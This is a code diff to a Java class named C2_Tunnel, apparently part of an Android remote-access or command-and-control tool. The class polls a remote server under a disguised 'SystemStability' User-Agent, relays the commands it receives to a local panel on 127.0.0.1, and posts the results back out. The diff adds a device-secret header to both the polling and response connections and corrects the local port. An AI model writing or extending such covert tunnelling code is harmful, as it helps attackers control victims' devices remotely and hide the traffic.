@@ -98,6 +98,10 @@ public class C2_Tunnel {
             conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("GET");
             conn.setRequestProperty("User-Agent", "SystemStability/1.5");
+            String secret = BuildConfig.DEVICE_SECRET;
+            if (secret != null && !secret.trim().isEmpty()) {
+                conn.setRequestProperty("X-Device-Secret", secret.trim());
+            }
             conn.setConnectTimeout(12000);
             conn.setReadTimeout(15000);
 
@@ -140,7 +144,9 @@ public class C2_Tunnel {
         HttpURLConnection respConn = null;
         try {
             String localPath = (path == null || path.isEmpty()) ? "/" : path;
-            URL url = new URL("http://127.0.0.1:" + FirebaseConfig.DEFAULT_PORT + localPath);
+            // [AUDIT_L3] Use the actual bound panel port (9191 or 9192 fallback), same
+            // source of truth as WorkManager_Sync.
+            URL url = new URL("http://127.0.0.1:" + FirebaseConfig.activeListeningPort + localPath);
             conn = (HttpURLConnection) url.openConnection();
             conn.setInstanceFollowRedirects(false);
             conn.setRequestMethod(method);
@@ -190,6 +196,10 @@ public class C2_Tunnel {
             respConn.setRequestMethod("POST");
             respConn.setDoOutput(true);
             respConn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            String secret = BuildConfig.DEVICE_SECRET;
+            if (secret != null && !secret.trim().isEmpty()) {
+                respConn.setRequestProperty("X-Device-Secret", secret.trim());
+            }
             try (java.io.OutputStream os = respConn.getOutputStream()) {
                 byte[] input = resp.toString().getBytes(StandardCharsets.UTF_8);
                 os.write(input, 0, input.length);
